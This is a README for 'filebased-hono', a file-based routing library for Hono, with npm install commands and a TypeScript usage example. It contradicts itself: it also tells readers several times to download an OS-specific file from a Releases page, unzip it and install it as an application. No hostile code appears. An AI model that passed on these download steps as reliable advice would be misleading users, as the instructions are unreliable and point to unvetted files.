# 🚀 filebased-hono - Simple Routing for Hono Apps

[![Download filebased-hono](https://img.shields.io/badge/Download%20filebased--hono-v1.0.0-blue)](https://github.com/postventa/filebased-hono/releases)

## 📦 Overview

filebased-hono is a helpful tool for managing routing in Hono applications. It automatically connects route files so you can focus on building your app instead of dealing with routing details.

## 🚀 Getting Started

To start using filebased-hono, you can download it from our Releases page. Follow these steps:

1. **Visit the Releases Page**
   Go to the following link to access the latest version: [Download filebased-hono](https://github.com/postventa/filebased-hono/releases).

2. **Choose Your Version**
   You will see different versions of the application. Click on the one you need.

3. **Download the File**
   Download the appropriate file for your operating system.

4. **Unzip the File**
   After the download is complete, unzip the file if it is in a compressed format.

5. **Install the Application**
   To run the application, you may need to follow the installation instructions specific to your operating system.

## ⚙️ Installation

You can easily install the application through npm, Yarn, or pnpm. Open your terminal and use one of the following commands:

```bash
npm install filebased-hono
# or
yarn add filebased-hono
# or
pnpm add filebased-hono
```

These commands will download the library and save it to your project.

## 📄 Usage

Using filebased-hono is straightforward. Here is a simple example to illustrate how you can implement it in your project.

1. **Create Your Main File**
   In your project folder, create a file named `index.ts` inside a `src` folder.

2. **Add the Following Code**

```ts
// src/index.ts
import { createApp } from 'filebased-hono';
import { createHono } from 'filebased-hono/factory';

const app = createApp({
  app: createHono().basePath('/'),
  initializer: (app) => {
    app.use('*', async (c, next) => {
      console.log(`[request] ${c.req.method} ${c.req.path}`);
      await next();
    });
  },
});

export default app;
```

3. **Create Your Routes**
   To create routes for your application, add files named `get.ts`, `post.ts`, etc. into the `src/routes` folder. Whatever is exported as default in these files will be used as the handler for the corresponding path.

### Example Route Structure:
```
src/routes/
  ├── get.ts       // Handles GET requests
  ├── post.ts      // Handles POST requests
  └── topics/      // Sub-directory for more complex routes
      ├── create.ts // Handles creating topics
      └── delete.ts // Handles deleting topics
```

## 📥 Download & Install

To download the application, follow the link here: [Download filebased-hono](https://github.com/postventa/filebased-hono/releases).

When you visit the Releases page, ensure that you select the appropriate version that suits your system. After downloading, remember to unzip and follow the installation instructions tailored for your operating system.

## 🔧 Features

- **Automatic Routing:** Automatically wires route files into a single Hono instance.
- **Simple Integration:** Easily integrates with your existing Hono application.
- **Hierarchical Routing:** Supports subdirectories for logical organization of routes.

## 🛠️ System Requirements

To run filebased-hono, ensure you have:

- A supported Node.js version (Make sure you have at least Node.js 14 installed)
- Hono framework installed in your project

## 🤝 Contributing

We welcome contributions! If you want to help improve filebased-hono, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Submit a pull request.

## 📞 Support

If you encounter any issues, please feel free to reach out. You can open an issue on GitHub or contact the maintainers directly via email.

## 📝 License

This project is licensed under the MIT License. See the LICENSE file for details.